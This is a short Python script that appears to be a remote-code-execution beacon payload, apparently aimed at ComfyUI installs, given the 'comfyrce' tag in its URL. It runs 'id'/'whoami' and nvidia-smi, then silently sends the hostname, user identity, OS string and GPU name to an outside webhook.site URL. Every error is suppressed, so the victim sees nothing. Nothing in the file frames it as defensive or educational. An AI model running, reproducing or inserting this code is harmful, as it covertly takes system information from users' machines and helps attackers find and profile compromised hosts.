import os, socket, platform, urllib.request, urllib.parse
try:
    u = os.popen('id 2>/dev/null || whoami').read().strip()[:80]
except Exception:
    u = 'na'
try:
    gpu = os.popen('nvidia-smi --query-gpu=name --format=csv,noheader 2>nul || nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null').read().strip().replace('\n','|').replace(' ','_')[:120]
except Exception:
    gpu = ''
try:
    url = "https://webhook.site/bdd91307-5fd3-4cbe-9d28-93ee1c1905ec/comfyrce?h=%s&u=%s&os=%s&g=%s" % (
        socket.gethostname(), urllib.parse.quote(u), platform.platform()[:40].replace(' ','_'), gpu)
    urllib.request.urlopen(url, timeout=8)
except Exception:
    pass
